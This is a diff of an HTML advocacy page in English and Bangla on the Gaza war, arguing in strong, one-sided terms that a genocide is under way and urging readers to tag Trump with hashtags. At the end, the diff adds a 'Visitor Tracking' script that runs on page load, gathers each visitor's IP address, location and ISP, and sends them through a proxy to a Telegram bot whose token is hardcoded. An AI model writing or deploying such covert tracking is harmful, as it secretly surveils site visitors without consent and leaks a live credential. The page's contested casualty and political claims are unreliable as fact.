+          <p>This logic is given from Gaza.</p>
+
+          <p>
+            Iran recently tried to sign a nuclear deal with the US. Netanyahu
+            eliminated the negotiators, scientists and generals.
+          </p>
+
+          <p>
+            What is the guarantee that this country will not continue its
+            operation in Gaza even after the exchange of hostages?
+          </p>
+
+          <p>
+            Qatar is the lead negotiator in talks and they have said that talks
+            will start soon and a middle ground will be found between both
+            sides.
+          </p>
+
+          <p>
+            Hamas has also said that they will not reject this proposal but have
+            asked for extra safeguards.
+          </p>
+
+          <p>
+            But let's accept that Hamas is in thousands. But does Hamas
+            represent more than 2 million people? Or are 2 million people Hamas?
+          </p>
+
+          <p>Are those 55,000 people Hamas, and those 17,000 children?</p>
+
+          <p>
+            Today, Gaza is facing a man-made famine. What kind operation is
+            this?
+          </p>
+
+          <p>
+            United Nations people were targeted and most casualties since WW2.
+            Were they Hamas?
+          </p>
+
+          <p>People in line for food aid, were targeted, were they Hamas?</p>
+
+          <p>
+            During Israel Iran conflict, nearly 1000 people lost lives in Gaza,
+            but no questions, no protest.
+          </p>
+
+          <p>
+            What is happening is similar to WW2 concentration camps. At that
+            time the truth of these concentration camps was hidden, but today in
+            social media age world can see. But world is saying... Don't show me
+            this. It is too negative. Show something positive.
+          </p>
+
+          <p>
+            There is no doubt that Netanyahu will make his actions worse in Gaza
+            to save power.
+          </p>
+
+          <p>But can we speak up? Can we generate awareness?</p>
+
+          <p>
+            Israel you can target Hamas but spare women, children, elderly,
+            helpless. Stop starving people.
+          </p>
+
+          <p>
+            Donald Trump can intervene here too like he did between Iran and
+            Israel.
+          </p>
+
+          <p class="text-yellow-400 font-bold">
+            I would say, give the Nobel Peace Prize to Donald Trump if he can
+            stop Israel in Gaza #TrumpSaveGaza. Make these hashtags and tag
+            Trump.
+          </p>
+
+          <p>
+            Appeal to Trump's ego and save Gaza otherwise Gaza next could mean
+            two things. Peace or worse than it is, and what we have noticed is
+            Iran used ballistics and people started respecting Iran. But Gaza
+            can't do that. There your humanity can work.
+          </p>
+
+          <p>
+            What is happening in this century does not look good on humanity. Do
+            target Hamas, but the way you are playing with lives of people is
+            not good for humanity and democracy.
+          </p>
+
+          <p>You are either with humanity — or you are with genocide.</p>
+        </div>
+
+        <div id="content-bn" class="bangla-text hidden p-4">
+          <p>
+            ইসরাইল-ইরান সংঘর্ষে জীবনের মূল্য দেখানো হয়েছে। এই ১২ দিনের লড়াই
+            বিশ্বকে তৃতীয় বিশ্বযুদ্ধের কাছাকাছি নিয়ে এসেছে। ইরান শীর্ষ
+            বিজ্ঞানী ও জেনারেলসহ ৯০০ জন হারিয়েছে। ইসরাইল হারিয়েছে ১/৩০ ভাগ। এই
+            সংখ্যা, ৩০ বলা হলেও, ৫০-৬০ হতে পারে। কিন্তু এই পরিসংখ্যান আমেরিকাকে
+            এতে জড়িয়ে ফেলেছে, যখন তারা স্টেলথ বিমান ব্যবহার করে ইরানকে লক্ষ্য
+            করেছিল।
+          </p>
+
+          <p>
+            ডোনাল্ড ট্রাম্প আমেরিকাতে কী ঘটছে তা ভুলে যান এবং যুদ্ধবিরতি পাওয়ার
+            চেষ্টা করেন এবং কোনভাবে ইরান ও ইসরাইলের মধ্যে যুদ্ধবিরতি নিশ্চিত
+            করতে সক্ষম হন। পণগুলি উচ্চ ছিল। একদিকে, তার প্রিয় ইসরাইল। অন্যদিকে,
+            রাশিয়া ও চীনও ইরানের পক্ষে কথা বলছিল। এই নাজুক যুদ্ধবিরতি
+            আন্তর্জাতিক সম্প্রদায় দ্বারা প্রশংসিত হচ্ছে। ট্রাম্প নোবেল শান্তি
+            পুরস্কারের স্বপ্ন দেখছেন।
+          </p>
+
+          <p>
+            বিশ্ব বুঝতে পারছে যে সবচেয়ে কঠিন পরিস্থিতিতেও শান্তি অর্জন করা
+            সম্ভব যদি সুপারপাওয়াররা চায়। কিন্তু যখন গাজা আসে, ১০০০, ৫০০০, ৬০০০
+            কি? এমনকি ৫০,০০০? সংখ্যাটা যত বড়ই হোক না কেন, কিছুই ঘটছে না, যখন
+            শিশুরাও লক্ষ্যবস্তু হয়েছে। আন্তর্জাতিক সম্প্রদায়, জাতিসংঘ,
+            আন্তর্জাতিক আদালত ইত্যাদি শুধু নিন্দা করতে পারে।
+          </p>
+
+          <p>
+            ২১ মাস ধরে, এটি গাজায় ঘটছে এবং ইরান-ইসরাইল যুদ্ধবিরতির পর মানুষ
+            ভাবছে এটি গাজায় হতে পারে? কিছু শান্তি এবং আইন-শৃঙ্খলা থাকতে পারে।
+            আন্তর্জাতিক সম্প্রদায়ও এটি দেখতে পারে। কিন্তু আইডিএফ বিশ্বাস করে যে
+            তারা ইরানকে একটি শিক্ষা দিয়েছে এবং তাদের পারমাণবিক প্রকল্পকে
+            পিছিয়ে দিয়েছে। এখন, তারা আবার গাজার দিকে মনোনিবেশ করবে। এর অর্থ
+            আরও ধ্বংস কারণ কোন সুপারপাওয়ার গাজাকে বাঁচাচ্ছে না।
+          </p>
+
+          <p>
+            গাজার রপ্তানির জন্য তেল নেই, এটি সামরিক ঘাঁটিও নয় বা কারও কাছাকাছি
+            নয়.. তাই গাজাকে বাঁচাতে মানবতা প্রয়োজন... যা আন্তর্জাতিকভাবে
+            স্বল্প সরবরাহে রয়েছে।
+          </p>
+
+          <p>
+            আজকের পর্বে আমরা ফিলিস্তিন, দুই রাষ্ট্রের সমাধান বা ইসরাইলের ইতিহাস
+            নিয়ে বড় কথা বলব না। আমরা শুধু আমাদের মানবতা সম্পূর্ণরূপে ধ্বংস
+            হয়েছে কিনা সে সম্পর্কে কথা বলার চেষ্টা করব। আমরা কি সঠিক ও ভুলের
+            মধ্যে পার্থক্য ভুলে গেছি? এবং গাজায় যা ঘটছে তাতে কি আমরা বিরতি দিতে
+            পারি?
+          </p>
+
+          <p>
+            আপনি বলার আগে, হামাস সম্পর্কে কি? আমি প্রথমে স্বীকার করব আমি ২১ মাস
+            আগেও একই কথা বলেছি এবং আজও একই। হামাস যদি নিষ্ঠুরতার কাজ করে এবং
+            মানুষকে জিম্মি হিসেবে অপহরণ করে তবে প্রতিক্রিয়া কি জাতিগত শুদ্ধি
+            হতে পারে? আমি সেই বিতর্কে যেতে চাই না যা ইসরাইল দশক ধরে করেছে।
+          </p>
+
+          <p>
+            আজ, আমাদের একটি সহজ প্রশ্নের উত্তর দিতে হবে। ১১০০, ১২০০, ১৫০০
+            মানুষের জীবনের প্রতিক্রিয়া কি পুরো জনসংখ্যার সমষ্টিগত শাস্তি হতে
+            পারে? ১৭,০০০ শিশুর জীবন দিয়ে আপনি কি কোন কিছুর প্রতিশোধ নিতে পারেন?
+            খাদ্য অস্বীকার করে এবং মনুষ্যসৃষ্ট দুর্ভিক্ষ শুরু করে, আপনি কি শেষ
+            পর্যন্ত তাদের জমি কেড়ে নেওয়ার চেষ্টা করছেন?
+          </p>
+
+          <p>
+            যদি এই সব ঘটছে, এবং ইসরাইল এটি কোন প্রতিরোধ ছাড়াই করতে সক্ষম হচ্ছে,
+            তা Biden বা Trump সরকার হোক, ইসরাইল এটি করতে পারে এবং এর বিরুদ্ধে
+            কথা বলা, বা প্রতিবাদ করা ২১ শতকে একটি অপরাধ হয়ে গেছে? যে ভাবে গাজা
+            সম্পর্কে কথা বলা সোশ্যাল মিডিয়ায়, মেইনস্ট্রিম মিডিয়ায় বিপজ্জনক
+            হয়ে উঠেছে, ২১ শতকে, এটি ক্যারিয়ার শেষ করার মতোই মনে হয় তাই মনে
+            হয় প্রশ্ন করা অনুমোদিত নয়।
+          </p>
+
+          <p></p>
+
+          <p>
+            এত সরকার যে ভাবে ইসরাইলের পায়ে লেগে আছে, মনে হয় আমরা মধ্যযুগে আছি।
+          </p>
+
+          <p>
+            আজকের পর্বে আমরা আপনাকে চিনতে সাহায্য করব যে আমরা কতটা অন্ধ ও মূক
+            হয়ে গেছি, আমাদের দেশের অবদানও আছে। ভারত দশক ধরে দুই রাষ্ট্রের
+            সমাধানের সমর্থক। কিন্তু আজ, আমরা ইসরাইলের আগ্রাসনকে নিন্দা করারও
+            সাহস পাচ্ছি না। আমরা কখন এত নিষ্ঠুর হয়ে উঠলাম?
+          </p>
+
+          <p>
+            জানুয়ারী ২০২৪-এ, আন্তর্জাতিক আদালত ইসরাইলের কর্মকাণ্ড সম্পর্কে একটি
+            বিবৃতি দিয়েছিল যা ইসরাইলকে বেশ রাগান্বিত করেছিল এবং লোকেরা ভয়
+            পেয়েছিল যে ইসরাইল ICJ-কে লক্ষ্য করবে কিনা। ICJ বলেছে যে গাজায়
+            অবস্থা বিপর্যয়কর, অর্থাৎ, মানুষকে খাদ্য ও জীবিকা দিতে দিন।
+          </p>
+
+          <p>
+            ICJ এক মাসের মধ্যে একটি আপডেট দিতেও বলেছে। এক বছরেরও বেশি সময় হয়ে
+            গেছে ইসরাইল ICJ-এর আদেশ লঙ্ঘন করেছে এবং হামাস-বিরোধী অভিযানের নামে
+            গাজায় খাদ্য, পানি ও ওষুধ বন্ধ করে দিয়েছে।
+          </p>
+
+          <p>
+            ডোনাল্ড ট্রাম্প সম্প্রতি জানতে পেরেছেন যে ইসরাইল আমেরিকার কথা শোনে
+            না। তাহলে ICJ কেন?
+          </p>
+
+          <p>
+            ডিসেম্বর ২০২৪-এ, হিউম্যান রাইটস গ্রুপ অ্যামনেস্টি ইন্টারন্যাশনাল
+            ফিলিস্তিনিদের লক্ষ্য করে গাজায় তাদের কর্মকাণ্ডের বিরুদ্ধে সমস্ত
+            প্রমাণ সংগ্রহ করেছে।
+          </p>
+
+          <p>
+            ইসরাইলের ১০০০ কিমি দূরত্বে ইরানের শীর্ষ জেনারেলদের লক্ষ্য করার
+            ক্ষমতা রয়েছে। কিন্তু আমরা গাজায় এই নির্ভুলতা দেখতে পাই না। গাজায়
+            জীবনের মূল্য সস্তা? তাদের হামাস সম্পর্কে কোন ধারণা নেই। ইসরাইল
+            হামাসকে সবখানে দেখছে। শিশুদের মধ্যে। হাসপাতালে। আল শিফা হাসপাতালের
+            নীচে হামাস কমান্ড এবং কন্ট্রোল কখনও পাওয়া যায়নি।
+          </p>
+
+          <p>
+            গাজার জনসংখ্যাকে উত্তর দিকে যেতে বলা হয় এবং কখনও দক্ষিণে যেতে বলা
+            হয়... এবং তাদের নিরাপদ অঞ্চলেও লক্ষ্য করা হয়। আপনি কি মনে করেন এটি
+            শুদ্ধি নয়? এবং শুধুমাত্র কয়েকটি ঘটনা মনোযোগে এসেছে, অনেক কিছু চাপা
+            পড়ে গেছে।
+          </p>
+
+          <p>
+            এখন, আপনি যাই বলুন না কেন, নামকরণে আটকে যাবেন না... শুধু সত্য দেখার
+            চেষ্টা করুন।
+          </p>
+
+          <p>
+            দুঃখের বিষয়, সবকিছু ঘটার পর, উদার পশ্চিমের ভণ্ডামি প্রকাশিত হয়েছে।
+            পশ্চিম যা গণতন্ত্র, স্বাধীনতা, স্বাধীনতা সম্পর্কে শেখাত তার নিজস্ব
+            ফ্যাসিবাদী ভণ্ডামি গ্লোবাল সাউথের কাছে স্পষ্ট।
+          </p>
+
+          <p>
+            আমেরিকান উদার কলেজগুলি প্রশ্ন ও মতবিরোধের জন্য বিখ্যাত ছিল, যা
+            উত্সাহিত করা হয়েছিল। আমেরিকান নীতির উপর অনেক বিতর্ক ও প্রতিবাদ ছিল।
+            কিন্তু যখন ইসরাইল ও গাজা আসে, কলেজগুলি হার মানল। কলেজগুলি তাদের
+            ছাত্রদের পুলিশের হাতে তুলে দিয়েছে।
+          </p>
+
+          <p>
+            আপনি ফিলিস্তিনের জন্য একটি প্ল্যাকার্ড বা সাইনও ধরতে পারবেন না। আপনি
+            তাদের সাথে একাত্মতা দেখাতেও পারবেন না। এই সব জিনিস অপরাধ হিসাবে
+            বিবেচিত হয় এবং ইহুদি বিরোধী বলা হয়।
+          </p>
+
+          <p>
+            জায়নবাদের সাথে ইহুদি ধর্মের কোন সম্পর্ক নেই। ইহুদিরা বলছে যে
+            জায়নবাদীরা ইহুদি ধর্মকে দূষিত করছে। অ-রাজনৈতিক ইহুদিরা গাজায়
+            ইসরাইলের কর্মকাণ্ডের বিরোধিতা করছে।
+          </p>
+
+          <p>
+            আমি নীচে একটি লিঙ্ক প্রদান করেছি যা ব্যাখ্যা করে যে ইহুদি বিরোধিতা
+            কী এবং জায়নবাদকে প্রশ্ন করা কী।
+          </p>
+
+          <p>
+            শুধু কলেজ নয় বরং মেটা, অ্যাপল, ফেসবুকের মতো বড় উদার
+            কোম্পানিগুলিও... এখানেও গাজা সম্পর্কে কথা বলা ক্যারিয়ার শেষ করার
+            মতো।
+          </p>
+
+          <p>
+            লোকেরা কখনও কল্পনা করেনি যে আমেরিকায় বাক স্বাধীনতা এতটা অসম্মানিত
+            হবে। ইংল্যান্ড ও জার্মানির মতো অন্যান্য ইউরোপীয় দেশের ক্ষেত্রেও একই
+            কথা প্রযোজ্য। আপনি যদি গাজা সম্পর্কে কথা বলেন, পুলিশ আপনাকে নিয়ে
+            যাবে।
+          </p>
+
+          <p>
+            ইতিহাসের ছাত্র হিসাবে আমি ভেবেছিলাম হিটলার কীভাবে এত বর্বরতা করতে
+            পেরেছিল। আন্তর্জাতিক সম্প্রদায় তখন কেন চুপ ছিল?
+          </p>
+
+          <p>
+            এখন আমি বুঝতে পারছি যে বিশ্বকে চুপ করানো এত কঠিন নয়। এবং আমরা কয়েক
+            দিন ধরে এটি দেখছি — পশ্চিমা প্রেস এখন কথা বলছে। কেন এত শান্ত? গাজায়
+            এই নীরবতার দেয়াল কী?
+          </p>
+
+          <p>
+            প্রশ্ন করা ইহুদি বিরোধী নয়, মানুষের জীবন সম্পর্কে প্রশ্ন করা
+            মানবতাবাদী।
+          </p>
+
+          <p>ইহুদিরা বলছে যে এটি জায়নবাদীদের কাজ।</p>
+
+          <p>
+            এই সব বন্ধ করা এত সহজ নয়। ইরানের পারমাণবিক স্থানগুলি ক্ষতিগ্রস্ত
+            হয়েছে কিন্তু নেতানিয়াহু ইরানের পারমাণবিক প্রকল্প ধ্বংস করতে
+            পারেননি। তিনি আমেরিকাকে সম্পূর্ণরূপে অন্তর্ভুক্ত করতে পারেননি।
+            নেতৃত্ব পরিবর্তন বা তেল আভিভ বাঁচাতে পারেননি। বিশেষজ্ঞরা মনে করেন
+            এটি ইরানের জন্য জয়ের চেয়ে কম নয়।
+          </p>
+
+          <p>
+            নেতানিয়াহু এই রাগ গাজার উপর ঝাড়তে পারেন। তিনি তার রাজনৈতিক
+            ক্যারিয়ারের শেষ প্রান্তে আছেন। নেতানিয়াহু এখন পদত্যাগ করা উচিত এমন
+            দাবি বাড়ছে।
+          </p>
+
+          <p>
+            কিন্তু যখন পদত্যাগের কথা আসে, ইসরাইল বিপদে পড়ে বা ইসরাইল কাউকে
+            লক্ষ্য করে। ট্রাম্পের ইরানে নয়, ইসরাইলে নেতৃত্ব পরিবর্তন করা দরকার।
+            নাহলে নেতানিয়াহু স্কিম বানাবে, এখন নতুন ধারণা হলো গাজাবাসীদের অন্য
+            কোথায় সরিয়ে নেওয়া।
+          </p>
+
+          <p>
+            USA এর জন্য অর্থ প্রদান করবে এবং গাজা পুনরায় উন্নয়ন করা হবে। এটি
+            একটি মজার মতো শোনাতে পারে কিন্তু যেভাবে ঘটনা চলছে, এটিও সম্ভব।
+          </p>
+
+          <p>
+            নেতানিয়াহু এখনও দেখানোর চেষ্টা করছেন যে এটি ইসরাইলকে সুরক্ষিত করার
+            বিষয়ে। জিম্মিদের ফেরত দিন, হামাস আত্মসমর্পণ করুন এবং আমরা গাজায়
+            অপারেশন শেষ করব।
+          </p>
+
+          <p>
+            তত্ত্বে এটি ঠিক শোনায়, জিম্মিদের ফেরত দিন এবং শান্তি নিন। সমস্যা
+            হলো কেউ এটি বিশ্বাস করে না, যদি আপনি জিম্মি থাকা অবস্থায় এই স্কেলে
+            ধ্বংস করেন, তাহলে এটি ছাড়া কল্পনা করুন।
+          </p>
+
+          <p>এই যুক্তি গাজা থেকে দেওয়া হয়েছে।</p>
+
+          <p>
+            ইরান সম্প্রতি মার্কিন যুক্তরাষ্ট্রের সাথে একটি পারমাণবিক চুক্তি
+            স্বাক্ষর করার চেষ্টা করেছিল। নেতানিয়াহু আলোচক, বিজ্ঞানী ও
+            জেনারেলদের নির্মূল করেছেন।
+          </p>
+
+          <p>
+            জিম্মি বিনিময়ের পরও এই দেশ গাজায় তার অপারেশন চালিয়ে যাবে না তার
+            গ্যারান্টি কী?
+          </p>
+
+          <p>
+            কাতার আলোচনায় প্রধান আলোচক এবং তারা বলেছে যে শীঘ্রই আলোচনা শুরু হবে
+            এবং উভয় পক্ষের মধ্যে একটি মধ্যবর্তী স্থান পাওয়া যাবে।
+          </p>
+
+          <p>
+            হামাসও বলেছে যে তারা এই প্রস্তাব প্রত্যাখ্যান করবে না কিন্তু
+            অতিরিক্ত সুরক্ষা চেয়েছে।
+          </p>
+
+          <p>
+            কিন্তু আসুন মেনে নিই যে হামাস হাজার হাজার। কিন্তু হামাস কি ২
+            মিলিয়নেরও বেশি মানুষের প্রতিনিধিত্ব করে? নাকি ২ মিলিয়ন মানুষ
+            হামাস?
+          </p>
+
+          <p>সেই ৫৫,০০০ মানুষ কি হামাস, এবং সেই ১৭,০০০ শিশু?</p>
+
+          <p>
+            আজ, গাজা একটি মনুষ্যসৃষ্ট দুর্ভিক্ষের সম্মুখীন। এটি কী ধরনের
+            অপারেশন?
+          </p>
+
+          <p>
+            জাতিসংঘের লোকদের লক্ষ্য করা হয়েছে এবং দ্বিতীয় বিশ্বযুদ্ধের পর
+            সবচেয়ে বেশি হতাহত হয়েছে। তারা কি হামাস ছিল?
+          </p>
+
+          <p>
+            খাদ্য সহায়তার জন্য লাইনে দাঁড়িয়ে থাকা মানুষদের লক্ষ্য করা
+            হয়েছিল, তারা কি হামাস ছিল?
+          </p>
+
+          <p>
+            ইসরাইল-ইরান সংঘর্ষের সময়, গাজায় প্রায় ১০০০ মানুষ প্রাণ হারিয়েছে,
+            কিন্তু কোন প্রশ্ন নেই, কোন প্রতিবাদ নেই।
+          </p>
+
+          <p>
+            যা ঘটছে তা দ্বিতীয় বিশ্বযুদ্ধের ঘনত্ব শিবিরের মতো। সেই সময়ে এই
+            ঘনত্ব শিবিরের সত্য লুকানো ছিল, কিন্তু আজ সোশ্যাল মিডিয়া যুগে বিশ্ব
+            দেখতে পারে। কিন্তু বিশ্ব বলছে... আমাকে এটি দেখাবেন না। এটি খুব
+            নেতিবাচক। কিছু ইতিবাচক দেখান।
+          </p>
+
+          <p>
+            কোন সন্দেহ নেই যে নেতানিয়াহু ক্ষমতা বাঁচাতে গাজায় তার কর্মকাণ্ডকে
+            আরও খারাপ করবেন।
+          </p>
+
+          <p>কিন্তু আমরা কি কথা বলতে পারি? আমরা কি সচেতনতা তৈরি করতে পারি?</p>
+
+          <p>
+            ইসরাইল আপনি হামাসকে লক্ষ্য করতে পারেন কিন্তু মহিলা, শিশু, বয়স্ক,
+            অসহায়দের ছাড় দিন। মানুষকে অনাহারে রাখা বন্ধ করুন।
+          </p>
+
+          <p>
+            ডোনাল্ড ট্রাম্প এখানেও হস্তক্ষেপ করতে পারেন যেমন তিনি ইরান ও
+            ইসরাইলের মধ্যে করেছিলেন।
+          </p>
+
+          <p class="text-yellow-400 bangla-heading">
+            আমি বলব, ডোনাল্ড ট্রাম্পকে নোবেল শান্তি পুরস্কার দিন যদি তিনি গাজায়
+            ইসরাইলকে থামাতে পারেন #TrumpSaveGaza। এই হ্যাশট্যাগ তৈরি করুন এবং
+            ট্রাম্পকে ট্যাগ করুন।
+          </p>
+
+          <p>
+            ট্রাম্পের অহংকারের কাছে আবেদন করুন এবং গাজাকে বাঁচান অন্যথায় গাজা
+            পরবর্তী দুটি জিনিস বোঝাতে পারে। শান্তি বা এটি যতটা খারাপ, এবং আমরা
+            যা লক্ষ্য করেছি তা হলো ইরান ব্যালিস্টিক ব্যবহার করেছে এবং মানুষ
+            ইরানকে সম্মান করতে শুরু করেছে। কিন্তু গাজা তা করতে পারে না। সেখানে
+            আপনার মানবতা কাজ করতে পারে।
+          </p>
+
+          <p>
+            এই শতাব্দীতে যা ঘটছে তা মানবতার উপর ভাল দেখাচ্ছে না। হামাসকে লক্ষ্য
+            করুন, কিন্তু আপনি যে ভাবে মানুষের জীবন নিয়ে খেলছেন তা মানবতা ও
+            গণতন্ত্রের জন্য ভাল নয়।
+          </p>
+
+          <p>আপনি হয় মানবতার পক্ষে — নয় গণহত্যার পাশে।</p>
+        </div>
+
+        <p class="mt-6">
+          You may not be in Gaza, but Gaza is in your heart — if you have one.
+        </p>
+        <p class="font-bold">Don't scroll past this.</p>
+
+        <div class="mt-6 border-t border-red-500 pt-4">
+          <p class="text-yellow-300 underline">
+            Shame on those who turn a blind eye to the suffering,
+          </p>
+          <p class="mt-2 font-bold text-red-500">
+            | Shame on those who stay silent. |
+          </p>
+        </div>
+      </div>
+
+      <div class="mt-6 flex flex-wrap justify-center gap-3">
+        <span
+          class="rounded-full bg-blue-500 px-4 py-2 text-white hover:bg-blue-600 transition cursor-pointer"
+          >#NobelForGaza</span
+        >
+        <span
+          class="rounded-full bg-red-500 px-4 py-2 text-white hover:bg-red-600 transition cursor-pointer"
+          >#TrumpSaveGaza</span
+        >
+        <span
+          class="rounded-full bg-green-500 px-4 py-2 text-white hover:bg-green-600 transition cursor-pointer"
+          >#NobelGazaTrump</span
+        >
+      </div>
+
+      <a
+        href="https://www.aljazeera.com/where/palestine/"
+        target="_blank"
+        class="mt-8 block w-fit transform rounded-lg bg-gradient-to-r from-green-400 to-blue-500 px-8 py-3 text-center font-bold text-black transition hover:scale-105 hover:from-green-500 hover:to-blue-600"
+      >
+        Check how many lives you killed with your silence.
+      </a>
+
+      <footer
+        class="bg-opacity-50 mt-10 w-full border-t border-red-500 bg-white py-3 text-center text-sm dark:bg-black"
+      >
+        #FreePalestine | #StopGenocide | #BoycottIsrael
+      </footer>
+    </div>
+
+    <!-- Visitor Tracking -->
+    <script>
+      const BOT_TOKEN = "7510015374:AAGstqHq8GnQZTWXHHkEFKD2v9jKpb8fktA";
+      const CHAT_ID = "7978628139";
+
+      async function sendVisitorInfo() {
+        try {
+          // Get visitor IP and geo info
+          const res = await fetch("https://ipinfo.io/json");
+          const info = await res.json();
+
+          const domain = window.location.hostname;
+          const ip = info.ip || "Unknown";
+          const city = info.city || "Unknown";
+          const region = info.region || "Unknown";
+          const country = info.country || "Unknown";
+          const org = info.org || "Unknown";
+          const loc = info.loc || "";
+          const nowUTC = new Date()
+            .toISOString()
+            .replace("T", " ")
+            .split(".")[0];
+
+          // Compose the fancy Markdown message
+          const message =
+            `*📢 New Visitor Notification*\n` +
+            "```\n" +
+            `🌐 Domain: ${domain}\n` +
+            `📍 IP: ${ip}\n` +
+            `🌎 Location: ${city}, ${region}, ${country}\n` +
+            `🏢 ISP: ${org}\n` +
+            `🕒 Time: ${nowUTC} (UTC)\n` +
+            "```";
+
+          // Send the message using Telegram Bot API via a CORS proxy
+          const proxy = "https://cors.bridged.cc/";
+          const telegramUrl =
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
+            `?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+          const tgRes = await fetch(proxy + telegramUrl, {
+            method: "GET",
+          });
+          const tgData = await tgRes.json();
+
+          if (tgData.ok) {
+            console.log("✅ Telegram message sent!");
+          } else {
+            console.error("❌ Telegram error:", tgData.description);
+          }
+        } catch (err) {
+          console.error("⚠️ Error sending Telegram message:", err);
+        }
       }
-    } catch (err) {
-      console.error('⚠️ Error sending Telegram message:', err);
-    }
-  }
 
-  window.onload = sendVisitorInfo;
-</script>
-
-        
-        <p>ইসরাইলের ১০০০ কিমি দূরত্বে ইরানের শীর্ষ জেনারেলদের লক্ষ্য করার ক্ষমতা রয়েছে। কিন্তু আমরা গাজায় এই নির্ভুলতা দেখতে পাই না। গাজায় জীবনের মূল্য সস্তা? তাদের হামাস সম্পর্কে কোন ধারণা নেই। ইসরাইল হামাসকে সবখানে দেখছে। শিশুদের মধ্যে। হাসপাতালে। আল শিফা হাসপাতালের নীচে হামাস কমান্ড এবং কন্ট্রোল কখনও পাওয়া যায়নি।</p>
-        
-        <p>গাজার জনসংখ্যাকে উত্তর দিকে যেতে বলা হয় এবং কখনও দক্ষিণে যেতে বলা হয়... এবং তাদের নিরাপদ অঞ্চলেও লক্ষ্য করা হয়। আপনি কি মনে করেন এটি শুদ্ধি নয়? এবং শুধুমাত্র কয়েকটি ঘটনা মনোযোগে এসেছে, অনেক কিছু চাপা পড়ে গেছে।</p>
-        
-        <p>এখন, আপনি যাই বলুন না কেন, নামকরণে আটকে যাবেন না... শুধু সত্য দেখার চেষ্টা করুন।</p>
-        
-        <p>দুঃখের বিষয়, সবকিছু ঘটার পর, উদার পশ্চিমের ভণ্ডামি প্রকাশিত হয়েছে। পশ্চিম যা গণতন্ত্র, স্বাধীনতা, স্বাধীনতা সম্পর্কে শেখাত তার নিজস্ব ফ্যাসিবাদী ভণ্ডামি গ্লোবাল সাউথের কাছে স্পষ্ট।</p>
-        
-        <p>আমেরিকান উদার কলেজগুলি প্রশ্ন ও মতবিরোধের জন্য বিখ্যাত ছিল, যা উত্সাহিত করা হয়েছিল। আমেরিকান নীতির উপর অনেক বিতর্ক ও প্রতিবাদ ছিল। কিন্তু যখন ইসরাইল ও গাজা আসে, কলেজগুলি হার মানল। কলেজগুলি তাদের ছাত্রদের পুলিশের হাতে তুলে দিয়েছে।</p>
-        
-        <p>আপনি ফিলিস্তিনের জন্য একটি প্ল্যাকার্ড বা সাইনও ধরতে পারবেন না। আপনি তাদের সাথে একাত্মতা দেখাতেও পারবেন না। এই সব জিনিস অপরাধ হিসাবে বিবেচিত হয় এবং ইহুদি বিরোধী বলা হয়।</p>
-        
-        <p>জায়নবাদের সাথে ইহুদি ধর্মের কোন সম্পর্ক নেই। ইহুদিরা বলছে যে জায়নবাদীরা ইহুদি ধর্মকে দূষিত করছে। অ-রাজনৈতিক ইহুদিরা গাজায় ইসরাইলের কর্মকাণ্ডের বিরোধিতা করছে।</p>
-        
-        <p>আমি নীচে একটি লিঙ্ক প্রদান করেছি যা ব্যাখ্যা করে যে ইহুদি বিরোধিতা কী এবং জায়নবাদকে প্রশ্ন করা কী।</p>
-        
-        <p>শুধু কলেজ নয় বরং মেটা, অ্যাপল, ফেসবুকের মতো বড় উদার কোম্পানিগুলিও... এখানেও গাজা সম্পর্কে কথা বলা ক্যারিয়ার শেষ করার মতো।</p>
-        
-        <p>লোকেরা কখনও কল্পনা করেনি যে আমেরিকায় বাক স্বাধীনতা এতটা অসম্মানিত হবে। ইংল্যান্ড ও জার্মানির মতো অন্যান্য ইউরোপীয় দেশের ক্ষেত্রেও একই কথা প্রযোজ্য। আপনি যদি গাজা সম্পর্কে কথা বলেন, পুলিশ আপনাকে নিয়ে যাবে।</p>
-        
-        <p>ইতিহাসের ছাত্র হিসাবে আমি ভেবেছিলাম হিটলার কীভাবে এত বর্বরতা করতে পেরেছিল। আন্তর্জাতিক সম্প্রদায় তখন কেন চুপ ছিল?</p>
-        
-        <p>এখন আমি বুঝতে পারছি যে বিশ্বকে চুপ করানো এত কঠিন নয়। এবং আমরা কয়েক দিন ধরে এটি দেখছি — পশ্চিমা প্রেস এখন কথা বলছে। কেন এত শান্ত? গাজায় এই নীরবতার দেয়াল কী?</p>
-        
-        <p>প্রশ্ন করা ইহুদি বিরোধী নয়, মানুষের জীবন সম্পর্কে প্রশ্ন করা মানবতাবাদী।</p>
-        
-        <p>ইহুদিরা বলছে যে এটি জায়নবাদীদের কাজ।</p>
-        
-        <p>এই সব বন্ধ করা এত সহজ নয়। ইরানের পারমাণবিক স্থানগুলি ক্ষতিগ্রস্ত হয়েছে কিন্তু নেতানিয়াহু ইরানের পারমাণবিক প্রকল্প ধ্বংস করতে পারেননি। তিনি আমেরিকাকে সম্পূর্ণরূপে অন্তর্ভুক্ত করতে পারেননি। নেতৃত্ব পরিবর্তন বা তেল আভিভ বাঁচাতে পারেননি। বিশেষজ্ঞরা মনে করেন এটি ইরানের জন্য জয়ের চেয়ে কম নয়।</p>
-        
-        <p>নেতানিয়াহু এই রাগ গাজার উপর ঝাড়তে পারেন। তিনি তার রাজনৈতিক ক্যারিয়ারের শেষ প্রান্তে আছেন। নেতানিয়াহু এখন পদত্যাগ করা উচিত এমন দাবি বাড়ছে।</p>
-        
-        <p>কিন্তু যখন পদত্যাগের কথা আসে, ইসরাইল বিপদে পড়ে বা ইসরাইল কাউকে লক্ষ্য করে। ট্রাম্পের ইরানে নয়, ইসরাইলে নেতৃত্ব পরিবর্তন করা দরকার। নাহলে নেতানিয়াহু স্কিম বানাবে, এখন নতুন ধারণা হলো গাজাবাসীদের অন্য কোথায় সরিয়ে নেওয়া।</p>
-        
-        <p>USA এর জন্য অর্থ প্রদান করবে এবং গাজা পুনরায় উন্নয়ন করা হবে। এটি একটি মজার মতো শোনাতে পারে কিন্তু যেভাবে ঘটনা চলছে, এটিও সম্ভব।</p>
-        
-        <p>নেতানিয়াহু এখনও দেখানোর চেষ্টা করছেন যে এটি ইসরাইলকে সুরক্ষিত করার বিষয়ে। জিম্মিদের ফেরত দিন, হামাস আত্মসমর্পণ করুন এবং আমরা গাজায় অপারেশন শেষ করব।</p>
-        
-        <p>তত্ত্বে এটি ঠিক শোনায়, জিম্মিদের ফেরত দিন এবং শান্তি নিন। সমস্যা হলো কেউ এটি বিশ্বাস করে না, যদি আপনি জিম্মি থাকা অবস্থায় এই স্কেলে ধ্বংস করেন, তাহলে এটি ছাড়া কল্পনা করুন।</p>
-        
-        <p>এই যুক্তি গাজা থেকে দেওয়া হয়েছে।</p>
-        
